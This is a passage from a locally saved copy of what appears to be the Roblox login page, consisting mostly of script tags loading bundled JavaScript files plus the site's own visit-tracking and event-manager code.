<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.SecurityQuestions" data-bundle-source="Unknown" src="./login_files/3574cff8a3839614386f61fdf914e02e5217a7878601ce33a9ff41f94a2ad8e3.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.SecurityQuestions" data-bundle-source="Unknown" src="./login_files/a054aec7da3a2b719cf38e09c5f6a9f45af54f6e632aa964ccc8b5ec2d83b9b0.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.Captcha" data-bundle-source="Unknown" src="./login_files/f173dcac2f8b211cb232d5295be7540816f52e299ec7086b07f27ddf9ce0a2c9.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.Captcha" data-bundle-source="Unknown" src="./login_files/98b97c4779bb10baadfc8a5a1ae049bba5dd9409be06896754f1446ab2048a60.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.Reauthentication" data-bundle-source="Unknown" src="./login_files/1057677ca91f349db02f7b279cdfbf25bec8098a13c7870317f7ad4cd4779a97.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.Reauthentication" data-bundle-source="Unknown" src="./login_files/3241cdd45931acc3efce4b49df4fe9583ed09d79994cc782364a84c4e851af5c.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ProofOfWorkChallenge" data-bundle-source="Unknown" src="./login_files/4963a609b0bb2465ffa6a7ad10bcff85662879d2f342f0cb1a2485320dd81eb5.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ProofOfWorkChallenge" data-bundle-source="Unknown" src="./login_files/c239c2a4cca7b50a6b45a6c32ee7ddfaa0bba7011c733c6db5aad0f6a7927d54.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="VerificationUpsell" data-bundle-source="Main" src="./login_files/6b48fdfe6a5d2f5b25093361b6a73963bf8dcafd467113bb21755ee58f6373fa.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.VerificationUpsell" data-bundle-source="Unknown" src="./login_files/f1c993578f9e72da8a554cf8931c293f8020438c236b4c304fb3d527e9e15638.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.VerificationUpsell" data-bundle-source="Unknown" src="./login_files/8cd6abee4abc62beee3af45eaa3a2894ce41c1d6a02bd6b158d5ea7001127921.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Experimentation" data-bundle-source="Main" src="./login_files/c4b0a446b38285f3db5472340f4ef27d737c87b78348e36dc7acbcfec89d70bf.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="RobloxBadges" data-bundle-source="Main" src="./login_files/68896d2573131793f425731c85898bbac9c88c13ed264c68cd8cc87b1c3545e4.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ProfileBadges" data-bundle-source="Unknown" src="./login_files/652fb1e29ca15ae17497ec3eb9aa4f4ebc9be9e0f4be6e68e2ff6ef6bf82c535.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ProfileBadges" data-bundle-source="Unknown" src="./login_files/34bae4c284cebfa0950c4e76dbc64b8ea982260cc4c29ec7e5ab9dfcc37b4a8b.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Navigation" data-bundle-source="Main" src="./login_files/a39d3a07466e224cf2104d217f5a6aadb4583bfcc90ca02661ab0c90f5d58ca9.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Common.AlertsAndOptions" data-bundle-source="Unknown" src="./login_files/57d1b7776de993a3bf8ace38e6efd8f8ce5b9a294362c029990f0cf131548531.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Common.AlertsAndOptions" data-bundle-source="Unknown" src="./login_files/385a62cb16e1c8524da81c17728733d79e3ad9ccbc342d982fe79352f8785dba.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ShopDialog" data-bundle-source="Unknown" src="./login_files/95fdafe5af749e388de603b9ee7f67bb092c3c790badc572db4e2bca0c32b49a.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ShopDialog" data-bundle-source="Unknown" src="./login_files/c0606e8d6eb4487cdc70d318e6de3d9aaeeb465ddb84acd95139011e56c5e5c6.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.Features" data-bundle-source="Unknown" src="./login_files/fe53bd639b60fc01e882dc8cb92984534f5f9fd6c274abfb901c37b3986962d7.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.Features" data-bundle-source="Unknown" src="./login_files/db335d7e2c25fb2bbd8a6b3bfcf3b56daf6d81546cd0f123a5bca162ccccb61e.js.pobrane"></script>

    

    
    <script type="text/javascript">Roblox.config.externalResources = [];Roblox.config.paths['Pages.Catalog'] = 'https://js.rbxcdn.com/109d883fe3988fca757e26e341ed0fe8.js';Roblox.config.paths['Pages.CatalogShared'] = 'https://js.rbxcdn.com/bcba3a83febab35eb41f3a0b8b96db37.js';Roblox.config.paths['Widgets.AvatarImage'] = 'https://js.rbxcdn.com/7d49ac94271bd506077acc9d0130eebb.js';Roblox.config.paths['Widgets.DropdownMenu'] = 'https://js.rbxcdn.com/da553e6b77b3d79bec37441b5fb317e7.js';Roblox.config.paths['Widgets.HierarchicalDropdown'] = 'https://js.rbxcdn.com/4a0af9989732810851e9e12809aeb8ad.js';Roblox.config.paths['Widgets.ItemImage'] = 'https://js.rbxcdn.com/61a0490ba23afa17f9ecca2a079a6a57.js';Roblox.config.paths['Widgets.PlaceImage'] = 'https://js.rbxcdn.com/a6df74a754523e097cab747621643c98.js';</script>

        <script>
            $(function () {
                Roblox.DeveloperConsoleWarning.showWarning();
            });
        </script>
    

<script type="text/javascript">
    $(function(){
        function trackReturns() {
            function dayDiff(d1, d2) {
                return Math.floor((d1-d2)/86400000);
            }
            if (!localStorage) {
                return false;
            }

            var cookieName = 'RBXReturn';
            var cookieOptions = {expires:9001};
            var cookieStr = localStorage.getItem(cookieName) || "";
            var cookie = {};

            try {
                cookie = JSON.parse(cookieStr);
            } catch (ex) {
                // busted cookie string from old previous version of the code
            }

            try {
                if (typeof cookie.ts === "undefined" || isNaN(new Date(cookie.ts))) {
                    localStorage.setItem(cookieName, JSON.stringify({ ts: new Date().toDateString() }));
                    return false;
                }
            } catch (ex) {
                return false;
            }

            var daysSinceFirstVisit = dayDiff(new Date(), new Date(cookie.ts));
            if (daysSinceFirstVisit == 1 && typeof cookie.odr === "undefined") {
                RobloxEventManager.triggerEvent('rbx_evt_odr', {});
                cookie.odr = 1;
            }
            if (daysSinceFirstVisit >= 1 && daysSinceFirstVisit <= 7 && typeof cookie.sdr === "undefined") {
                RobloxEventManager.triggerEvent('rbx_evt_sdr', {});
                cookie.sdr = 1;
            }
            try {
                localStorage.setItem(cookieName, JSON.stringify(cookie));
            } catch (ex) {
                return false;
            }
        }

        GoogleListener.init();


    
        RobloxEventManager.initialize(true);
        RobloxEventManager.triggerEvent('rbx_evt_pageview');
        trackReturns();
        

    
        RobloxEventManager._idleInterval = 450000;
        RobloxEventManager.registerCookieStoreEvent('rbx_evt_initial_install_start');
        RobloxEventManager.registerCookieStoreEvent('rbx_evt_ftp');
        RobloxEventManager.registerCookieStoreEvent('rbx_evt_initial_install_success');
        RobloxEventManager.registerCookieStoreEvent('rbx_evt_fmp');
        

    });

</script>


    
    

<script type="text/javascript">
    var Roblox = Roblox || {};
    Roblox.UpsellAdModal = Roblox.UpsellAdModal || {};

    Roblox.UpsellAdModal.Resources = {
        title: "Remove Ads Like This",
        body: "Builders Club members do not see external ads like these.",
        accept: "Upgrade Now",
        decline: "No, thanks"
    };
</script>

    
    <script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="page" type="text/javascript" src="./login_files/b1b11b1fec2f0a024f5a719620b8e134.js.pobrane"></script>


    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="StyleGuide" data-bundle-source="Main" src="./login_files/58287ea939e42dc2f79ad23610b6ff6ae94cfe7dbd12dde3c08468256460ca29.js.pobrane"></script>

<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="CookieBannerV3" data-bundle-source="Main" src="./login_files/7693d98990f875a88c91c0385e1b0542bb51913fb34b23f414b6890d90353c40.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.Messages" data-bundle-source="Unknown" src="./login_files/18dede93de3aac02225e1e6e9957d98d6983c39fc9e76eb0cdb05090e5551f95.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.Messages" data-bundle-source="Unknown" src="./login_files/5b148ca445e1fd4ef905bc3665b2e29d065ab357cc88fd68be95b519f6e2da0d.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.Tracking" data-bundle-source="Unknown" src="./login_files/ce6a4105a4d28cac59aa57a3d6615d56ba63526569ebfd88d49ac363d61caddb.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.Tracking" data-bundle-source="Unknown" src="./login_files/fb47e86d6d7deaf62c7c5c8a62d915361b3f9b47503976e24e4fdd44710a492e.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Footer" data-bundle-source="Main" src="./login_files/bffafd994791f59d1efb67723313fc0f59b58fef8dec7cf83535c8f4d1d1ebd9.js.pobrane"></script>
    
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Captcha" data-bundle-source="Main" src="./login_files/523958ed41b5e1cfecdd3a29a57074d0dd62ff6ba572fefbebc76ff8d48024d5.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="CrossDeviceLoginDisplayCode" data-bundle-source="Main" src="./login_files/0983378c7bc1429407a6fd1707daba2efc98d5c8fb1673abe3248f419378f393.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.CrossDevice" data-bundle-source="Unknown" src="./login_files/f1bb7a80136777bca7d2f9583c144455502da76e7d298f7b542655352db9c003.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.CrossDevice" data-bundle-source="Unknown" src="./login_files/696ffcf1a1c514c9f969252335cea2574d572f7c79dd87171817e54da91a2a37.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="ReactLogin" data-bundle-source="Main" src="./login_files/fc0c6885b241073649ae43a2cf1d03e84bd5bb901ab4838ce58b7e3107b59b05.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.Login" data-bundle-source="Unknown" src="./login_files/cf8007c7bce4435c31ba6aaaa41b27285e3a2e3c2bca7c2fdbb03da982e32a76.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.Login" data-bundle-source="Unknown" src="./login_files/80ebdc7734ff5f0d4f9def8f7ebb22ee6c85d8962c905b42ab37dc2f29e2d056.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Common.Captcha" data-bundle-source="Unknown" src="./login_files/fe345fa49171e73999c333520b87bb3051dbd4c4e74c2ca9ebf8a8c05110f96a.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Common.Captcha" data-bundle-source="Unknown" src="./login_files/a6621e0d27855e4e2afe111af5aff2146ad81993b241f77c3188671c2704b7db.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="AccountRecoveryModal" data-bundle-source="Main" src="./login_files/0056022aadda7fc97ab043ed4f014c54aa31c5b13aa2d33840a736db2bc286b4.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.ResetPassword" data-bundle-source="Unknown" src="./login_files/03d62688de37ed1079ba45b61b888189f84519e8f2c6b933846834b5e8bc57ad.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.ResetPassword" data-bundle-source="Unknown" src="./login_files/6673ed66b2734170461c0ef2a2ed9904de9aaad91d642130ecace73c765112df.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.Controls" data-bundle-source="Unknown" src="./login_files/1e9c21f67e9901f767acd1db03c4a5c6029d4bc0862424e80c746d6e3cf5b99c.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.Controls" data-bundle-source="Unknown" src="./login_files/5c44d71f75449192684a6558fdffae735d08a0a29e18c656dc0374df397a0050.js.pobrane"></script>





    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="ItemPurchase" data-bundle-source="Main" src="./login_files/5804331763d8dd8d8fb671924b73023bd1feddd205229569f18413e6f0190f93.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.Item" data-bundle-source="Unknown" src="./login_files/9cf047a292f5735b2ce9c1896e1951a873acc17e0d794deddde210b8bd91d6d4.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.Item" data-bundle-source="Unknown" src="./login_files/0eb9f3bc4309642fdf241b8263d8987cbe07add49b9342084cdc23be4e042d93.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Purchasing.PurchaseDialog" data-bundle-source="Unknown" src="./login_files/9f0d42e4c1d1caec59d4fafd16cd31cb945433a50cc63f2a197d9b60d2b7a989.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Purchasing.PurchaseDialog" data-bundle-source="Unknown" src="./login_files/0d3ba3cd162212eb04b26996eda08e542bd0febd250e1e03bba5a932dcb3d84f.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ItemModel" data-bundle-source="Unknown" src="./login_files/97b99d5ea1fd09bf3fa4aed595502676b5c6d366675698913916b7b0f1b33a30.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ItemModel" data-bundle-source="Unknown" src="./login_files/8f8d451cbe04b730d167b5ce92019da934a5c2da928ca13d9b3eb15cbe2ff5d5.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="IdVerification" data-bundle-source="Main" src="./login_files/ee5d5f7dba6655d1b58ce17287fcd80d6552114f4d136a8d639dadfa641b2916.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Verification.Identity" data-bundle-source="Unknown" src="./login_files/6ca23c4bef0b8c2ee82d1bcf9bb3c52c2d8c6b1c6c69ad40ed2d03d0887335e2.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Verification.Identity" data-bundle-source="Unknown" src="./login_files/3f6cf43ba9cc024bb84a85caee38f7c5b98ce5a2e3006d197f21eecc25f495c7.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="GameLaunch" data-bundle-source="Main" src="./login_files/8774bfc9481894639c8b95fac397a44109dfde7632d21215c881a63783d5f22b.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Common.VisitGame" data-bundle-source="Unknown" src="./login_files/4ce2522516aad306779a46144f39800e2adb1f31cac04881daa88aaa96cc97bf.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Common.VisitGame" data-bundle-source="Unknown" src="./login_files/c15073cf382cb56f2db0437ffcd3b9de10a92d99da9833badf3713c969485bce.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.GameLaunchGuestMode" data-bundle-source="Unknown" src="./login_files/f41ec06eeae79fa94e6ae9f435b0a1c6743085e898884eddb4d4025ca3af8a44.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.GameLaunchGuestMode" data-bundle-source="Unknown" src="./login_files/6852af8f7df15395ccb3d121a914ee7301a7162f5afb3395575c6075c617923f.js.pobrane"></script>


    


    




<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="UserAgreementsChecker" data-bundle-source="Main" src="./login_files/a411b4655a0c97ad1d8209c2daa1e92b0dfc5d66716efcfea310f491aabf1ef6.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.UserAgreements" data-bundle-source="Unknown" src="./login_files/c46b4fb03550b521b63f90cdca3214e620c53f676987f9c644dc3ed60a9d74c9.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.UserAgreements" data-bundle-source="Unknown" src="./login_files/358e6ae5bebb0fa9326d0de99d3ee229ee63236bf44ed11b9ab1d314c7972e79.js.pobrane"></script>



    

    <script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="pageEnd" type="text/javascript" src="./login_files/c8ffe9b0727f42a01a3c6dfc999e2e0a.js.pobrane"></script>




</body></html>